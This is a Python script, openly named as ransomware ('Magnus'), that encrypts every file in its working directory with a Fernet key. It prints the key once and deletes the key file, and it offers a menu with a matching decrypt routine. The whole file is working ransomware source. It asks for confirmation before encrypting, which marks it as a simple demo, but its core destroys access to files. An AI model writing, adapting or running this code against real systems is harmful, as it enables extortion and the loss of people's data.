import os    # Imports a library that allows system commands
from cryptography.fernet import Fernet    # Imports a library that allows encryption


class ransomware:    # Sets up the class we will be using 
    def encrypt():    # Defines the function we will use to encrypt user files
        files = []    # Declares a list we will store user files in
        key = Fernet.generate_key()    # Generates a private key

        for file in os.listdir():    # This loop scans through all the files in the current directory and appends them to the files list
            if file == 'Magnus.py' or file == 'key.key':    # Ignores the script and key so they dont get encrypted
                continue
            
            if os.path.isfile(file):   
                files.append(file)
        
        while True:
            os.system('cls')    # Clears console
            print(f'{files}\n\nThese files will be encrypted')
            x = input('\nDo you want to continue? (y/n): ')
            if x == 'y':
                break
            elif x == 'n':
                main()
            else:
                continue

        with open('key.key', 'wb') as thekey:    # Writes the key to a file
            thekey.write(key)

        for file in files:    # A loop reads and writes file contents to a variable and then encrypts them
            with open(file, 'rb') as thefile:
                contents = thefile.read()

            contents_encrypted = Fernet(key).encrypt(contents)
            
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
        
        with open('key.key', 'r') as thekey:
            os.system('cls')
            print(f'\nYour key is: {thekey.read()}')

        os.remove('key.key')    # Removes the key file
        input('\nAll files have been encrypted,\n\nPress any key to return to menu: ')

    def decrypt():    # Defines the function we will use to decrypt user files
        files = []    # Declares a list we will store user files in

        for file in os.listdir():    # This loop scans through all the files in the current directory and appends them to the files list
            if file == 'Magnus.py' or file == 'key.key':    # Ignores the script and key so they dont get encrypted
                continue
            
            if os.path.isfile(file):
                files.append(file)

        while True:
            os.system('cls')
            print(f'{files}\n\nThese files will be decrypted')
            x = input('\nDo you want to continue? (y/n): ')
            if x == 'y':
                break
            elif x == 'n':
                main()
            else:
                continue
        
        while True:
            os.system('cls')
            key = input('Enter the decryption key: ')

            try:
                for file in files:    # Reads files and then encrypts them
                    with open(file, 'rb') as thefile:
                        contents = thefile.read()

                    contents_decrypted = Fernet(key).decrypt(contents)
                    
                    with open(file, 'wb') as thefile:
                        thefile.write(contents_decrypted)
                
                input('\nAll files have been decrypted,\n\nPress any key to return to menu: ')
                break
            
            except:
                continue

def main():    # Main menu function that allows users to select from encrypting and decrypting
    while True:
        os.system('cls')
        print("""                                                                  
_/      _/                                                
_/_/  _/_/   _/_/_/   _/_/_/ _/_/_/   _/    _/   _/_/_/   
_/  _/  _/ _/    _/ _/    _/ _/    _/ _/    _/ _/_/        
_/      _/ _/    _/ _/    _/ _/    _/ _/    _/     _/_/     
_/      _/   _/_/_/   _/_/_/ _/    _/   _/_/_/ _/_/_/        
                         _/                                  
                     _/_/                                      
\n\n1) Encrypt
2) Decrypt
3) Exit""")
        x = input("\n>>$ ")
        if x == '1':
            os.system('cls')
            ransomware.encrypt()    # Starts

        elif x == '2':
            os.system('cls')
            ransomware.decrypt()

        elif x == '3':
            quit()

        else:
            print("Invalid option")
main()
